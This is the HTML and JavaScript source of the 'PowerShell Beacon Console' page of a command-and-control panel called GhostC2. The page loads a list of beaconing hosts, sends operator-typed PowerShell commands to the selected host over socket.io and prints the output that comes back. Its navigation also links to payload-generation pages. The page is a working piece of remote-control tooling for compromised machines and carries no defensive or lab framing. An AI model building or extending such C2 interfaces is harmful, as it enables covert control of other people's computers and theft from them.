<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>GhostC2 PS Console</title>
    <script src="https://cdn.socket.io/4.0.1/socket.io.min.js"></script>
    <style>
        /* Styles identical to the Python console for visual consistency */
        :root {
            --accent: #22ff44;
            --status-glow: 0 0 10px 2px #22ff4499;
        }
        body {
            background: #111316;
            color: #e3e3e3;
            font-family: 'Inter', Arial, sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            min-height: 100vh;
        }
        #sidebar {
            width: 190px;
            background: #181a1f;
            border-right: 1.5px solid #222;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            position: fixed;
            left: 0; top: 0;
            z-index: 100;
        }
        #sidebar .logo {
            font-size: 1.18em;
            font-weight: 700;
            padding: 30px 20px 36px 24px;
            color: var(--accent);
            letter-spacing: 0.04em;
        }
        #sidebar nav {
            flex: 1;
            display: flex;
            flex-direction: column;
        }
        #sidebar a {
            color: #dadada;
            text-decoration: none;
            padding: 13px 30px 13px 24px;
            font-size: 1em;
            border-left: 3px solid transparent;
            font-weight: 500;
            transition: background 0.12s, border-color 0.14s, color 0.15s;
        }
        #sidebar a.active {
            border-left: 3px solid var(--accent);
            color: var(--accent);
            background: #16181d;
        }
        #sidebar a:hover {
            background: #16181d;
            color: var(--accent);
        }
        #main {
            margin-left: 190px;
            padding: 32px 38px 32px 38px;
            width: 100%;
        }
        h2 {
            font-size: 1.36em;
            font-weight: 700;
            color: #e3e3e3;
            margin-top: 0;
            margin-bottom: 16px;
        }
        #terminal {
            background: #181a1f;
            padding: 14px;
            height: 350px;
            overflow-y: auto;
            border: 1.5px solid #23262a;
            margin-bottom: 15px;
            font-family: 'JetBrains Mono', monospace;
            font-size: 1em;
        }
        #input {
            width: 100%;
            background: #16181d;
            color: var(--accent);
            border: 1.5px solid var(--accent);
            padding: 11px;
            font-family: 'JetBrains Mono', monospace;
            font-size: 1em;
        }
        .console-cmd {
            color: var(--accent);
            margin: 0;
        }
        .console-result {
            color: #c8facc;
            margin: 0 0 12px 0;
        }
    </style>
</head>
<body>
    <div id="sidebar">
        <div class="logo">GhostC2</div>
        <nav>
            <a href="/">Dashboard</a>
            <a href="/console">Live Console</a>
            <a href="/console_ps" class="active">PS Console</a>
            <a href="/generate">Generate Payload</a>
            <a href="/generate_ps_payload">PowerShell Payload</a>
        </nav>
    </div>
    <div id="main">
        <h2>PowerShell Beacon Console</h2>
        <label for="hostSelect">Select PS Host:</label>
        <select id="hostSelect"></select>
        <div id="terminal"></div>
        <input id="input" placeholder="Enter PowerShell command and press Enter">
    </div>
    <script>
        const socket = io();
        const input = document.getElementById('input');
        const terminal = document.getElementById('terminal');
        const hostSelect = document.getElementById('hostSelect');

        fetch('/console_ps_data')
            .then(res => res.json())
            .then(data => {
                data.hosts.forEach(h => {
                    const opt = document.createElement('option');
                    opt.value = opt.textContent = h;
                    hostSelect.appendChild(opt);
                });
            });

        input.addEventListener('keydown', function (e) {
            if (e.key === 'Enter') {
                const command = input.value.trim();
                const host = hostSelect.value;
                if (!host || !command) return;
                socket.emit('ps_command', { hostname: host, command });

                const cmdLine = document.createElement('pre');
                cmdLine.textContent = `> ${command}`;
                cmdLine.className = 'console-cmd';
                terminal.appendChild(cmdLine);
                input.value = '';
            }
        });

        socket.on('ps_output', data => {
            console.log("ðŸ”” PS OUTPUT RECEIVED", data);
            console.log("[ps_output]", data);
            const selectedHost = hostSelect.value;
            if (data.hostname.toLowerCase() === selectedHost.toLowerCase()) {
                const resultLine = document.createElement('pre');
                resultLine.textContent = data.output;
                resultLine.className = 'console-result';
                terminal.appendChild(resultLine);
                terminal.scrollTop = terminal.scrollHeight;
            }
        });
    </script>
</body>
</html>
